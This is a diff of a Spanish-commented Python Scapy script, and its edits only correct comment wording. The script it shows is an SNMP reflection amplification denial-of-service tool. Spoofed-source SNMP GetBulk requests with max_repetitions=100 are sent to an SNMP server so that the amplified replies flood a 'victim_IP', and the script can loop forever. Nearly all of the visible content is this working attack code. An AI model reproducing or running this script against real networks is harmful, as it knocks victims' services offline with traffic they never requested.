@@ -19,7 +19,7 @@ parser.add_argument('-s', action="store",dest='count', help='La cantidad de paqu
 args = parser.parse_args()
 
 
-if len(sys.argv) == 1: # Obliga a mostrar el testo del 'help' sino hay argumentos ingresados.
+if len(sys.argv) == 1: # Obliga a mostrar el texto del 'help' sino hay argumentos ingresados.
     parser.print_help()
     sys.exit(1)
 args = vars(args) # Convierte los argumentos en formato diccionario para facil manejo.
@@ -40,13 +40,13 @@ else:
 
 if args['count'] == "X" or args['count'] == "x": # Si se ingresa x o X se enviara infinitos paquetes
       while (1 == 1):
-        w =IP(dst=args['snmp_server'],src=args['victim_IP'])/UDP(sport=RandShort(),dport=uport)/SNMP(version="v2c",community=communi,PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)), SNMPvarbind(oid=ASN1_OID(oid))]))# Esta linea construye el paquete SNMP a solicitar utilizando los argumentos ingresados
+        w =IP(dst=args['snmp_server'],src=args['victim_IP'])/UDP(sport=RandShort(),dport=uport)/SNMP(version="v2c",community=communi,PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)), SNMPvarbind(oid=ASN1_OID(oid))]))# Esta linea construye el paquete SNMP utilizando los argumentos ingresados
         send(w,  verbose=0) # Envia el paquete
         iterationCount = iterationCount + 1
         print(str(iterationCount) + " Paquete enviado")# Mensaje en pantalla
 else: # Se ejecuta si el usuario digita la cantidad de paquetes que va enviar
     while iterationCount < int(args['count']):
-        w =IP(dst=args['snmp_server'],src=args['victim_IP'])/UDP(sport=RandShort(),dport=uport)/SNMP(version="v2c",community=communi,PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)),SNMPvarbind(oid=ASN1_OID(oid) )]))# Se envia paquete SNMP a solicitar utilizando los argumentos ingresados
+        w =IP(dst=args['snmp_server'],src=args['victim_IP'])/UDP(sport=RandShort(),dport=uport)/SNMP(version="v2c",community=communi,PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)),SNMPvarbind(oid=ASN1_OID(oid) )]))# Se envia paquete SNMP  utilizando los argumentos ingresados
         send(w,  verbose=0) # Envia el paquete
         iterationCount = iterationCount + 1
         print(str(iterationCount) + " Paquete enviado")
